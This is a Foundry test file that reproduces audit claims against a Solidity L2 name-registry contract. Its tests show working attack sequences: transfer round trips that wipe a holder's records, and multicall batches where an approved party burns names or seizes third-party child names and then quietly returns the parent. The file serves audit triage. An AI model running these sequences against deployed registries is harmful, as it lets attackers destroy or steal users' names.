// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {Clones} from "@openzeppelin/contracts/proxy/Clones.sol";
import {L2Registry} from "../src/durin/L2Registry.sol";

/**
 * Triage of LeftClaw job 950 against v2.1 at f4a673b. Each test REPRODUCES a
 * claim as written; none is a fix. Written before judging the report.
 *
 * 950 [1] High: multicall lets a momentary holder use holder-only doors.
 * 950 [2] Medium: a two-leg round trip restores the 948/949 record wipe.
 */
contract Audit950TriageTest is Test {
    L2Registry registry;

    address admin = makeAddr("admin");
    address registrar = makeAddr("registrar");
    address holder = makeAddr("holder");
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    bytes constant SITE = hex"e40101fa011b20d1de9994b4d039f6548d191eb26786769f580809256b4685ef316805265ea162";

    function setUp() public {
        vm.warp(1_800_000_000);
        registry = L2Registry(Clones.clone(address(new L2Registry())));
        registry.initialize("woco.eth", "WoCo Names", "", admin);
        vm.prank(admin);
        registry.addRegistrar(registrar);
    }

    function _mint(string memory label, address to) internal returns (bytes32 node) {
        bytes32 base = registry.baseNode();
        bytes[] memory none = new bytes[](0);
        vm.prank(registrar);
        node = registry.createSubnode(base, label, to, none);
    }

    function _mintUnder(bytes32 parent, string memory label, address to) internal returns (bytes32 node) {
        bytes[] memory none = new bytes[](0);
        vm.prank(registry.owner(parent));
        node = registry.createSubnode(parent, label, to, none);
    }

    // ── 950 [2] Medium: the round trip ──────────────────────────────────────

    /// Claimed: two ordinary transfers, no multicall needed, wipe the records.
    function test_950_M_roundTripWipesRecords_TwoPlainCalls() public {
        bytes32 node = _mint("venue", holder);
        vm.startPrank(holder);
        registry.setContenthash(node, SITE);
        registry.setAddr(node, 60, abi.encodePacked(holder));
        registry.setApprovalForAll(attacker, true); // an ordinary marketplace listing
        vm.stopPrank();

        uint64 v0 = registry.recordVersions(node);
        assertEq(registry.contenthash(node), SITE, "precondition: records present");

        vm.startPrank(attacker);
        registry.transferFrom(holder, attacker, uint256(node));
        registry.transferFrom(attacker, holder, uint256(node));
        vm.stopPrank();

        assertEq(registry.owner(node), holder, "the name came back to its holder");
        assertEq(registry.recordVersions(node), v0 + 2, "the version advanced by two");
        assertEq(registry.contenthash(node).length, 0, "CLAIM HOLDS: contenthash destroyed");
        assertEq(registry.addr(node, 60).length, 0, "CLAIM HOLDS: addr destroyed");
    }

    /// Claimed: setApprovalForAll survives a transfer, so this repeats forever.
    function test_950_M_theOperatorApprovalSurvivesAndItRepeats() public {
        bytes32 node = _mint("venue", holder);
        vm.startPrank(holder);
        registry.setContenthash(node, SITE);
        registry.setApprovalForAll(attacker, true);
        vm.stopPrank();
        uint64 v0 = registry.recordVersions(node);

        for (uint256 i; i < 3; ++i) {
            vm.startPrank(attacker);
            registry.transferFrom(holder, attacker, uint256(node));
            registry.transferFrom(attacker, holder, uint256(node));
            vm.stopPrank();
        }
        assertTrue(registry.isApprovedForAll(holder, attacker), "operator approval survived");
        assertEq(registry.recordVersions(node), v0 + 6, "CLAIM HOLDS: repeatable, 2 per round");
    }

    // ── 950 [1] High: momentary holder through multicall ────────────────────

    /// Claimed: an approvee burns the name irreversibly inside one multicall.
    function test_950_H_approveeBurnsTheNameThroughMulticall() public {
        bytes32 node = _mint("venue", holder);
        vm.prank(holder);
        registry.approve(attacker, uint256(node)); // a single per-token approval

        bytes[] memory batch = new bytes[](2);
        batch[0] = abi.encodeCall(registry.transferFrom, (holder, attacker, uint256(node)));
        batch[1] = abi.encodeCall(registry.release, (node));

        vm.prank(attacker);
        registry.multicall(batch);

        assertEq(registry.owner(node), address(0), "CLAIM HOLDS: the name is burned");
    }

    /// Claimed: adminTransfer, the documented recovery path, cannot undo it.
    function test_950_H_adminCannotRecoverABurnedName() public {
        bytes32 node = _mint("venue", holder);
        vm.prank(holder);
        registry.approve(attacker, uint256(node));
        bytes[] memory batch = new bytes[](2);
        batch[0] = abi.encodeCall(registry.transferFrom, (holder, attacker, uint256(node)));
        batch[1] = abi.encodeCall(registry.release, (node));
        vm.prank(attacker);
        registry.multicall(batch);

        vm.prank(admin);
        vm.expectRevert(abi.encodeWithSignature("AdminTransferUnregistered(bytes32)", node));
        registry.adminTransfer(node, holder);
    }

    /// Claimed (most severe): one approval on a PARENT reaches third-party
    /// children whose holders approved nobody, and the parent is handed back.
    function test_950_H_thirdPartyChildSeizure() public {
        bytes32 parent = _mint("market", holder);
        bytes32 childA = _mintUnder(parent, "stallone", victim);
        bytes32 childB = _mintUnder(parent, "stalltwo", victim);
        assertEq(registry.owner(childA), victim, "precondition: the victim holds its own name");

        vm.prank(holder);
        registry.approve(attacker, uint256(parent));

        bytes[] memory batch = new bytes[](4);
        batch[0] = abi.encodeCall(registry.transferFrom, (holder, attacker, uint256(parent)));
        batch[1] = abi.encodeCall(registry.parentTransfer, (childA, attacker));
        batch[2] = abi.encodeCall(registry.release, (childB));
        batch[3] = abi.encodeCall(registry.transferFrom, (attacker, holder, uint256(parent)));

        vm.prank(attacker);
        registry.multicall(batch);

        assertEq(registry.owner(childA), attacker, "CLAIM HOLDS: third-party name seized");
        assertEq(registry.owner(childB), address(0), "CLAIM HOLDS: third-party name burned");
        assertEq(registry.owner(parent), holder, "the parent was handed back, nothing looks amiss");
    }

    /// Claimed: createSubnode's own guard is bypassed by continuing outside it.
    function test_950_H_createSubnodeGuardBypassedByASecondCall() public {
        bytes32 base = registry.baseNode();
        bytes[] memory none = new bytes[](0);
        bytes32 subnode = keccak256(abi.encodePacked(base, keccak256(bytes("ghost"))));

        bytes[] memory batch = new bytes[](2);
        batch[0] = abi.encodeCall(registry.createSubnode, (base, "ghost", registrar, none));
        batch[1] = abi.encodeCall(registry.release, (subnode));

        vm.prank(registrar);
        registry.multicall(batch);

        assertEq(registry.owner(subnode), address(0), "CLAIM HOLDS: announced then gone, guard silent");
    }
}
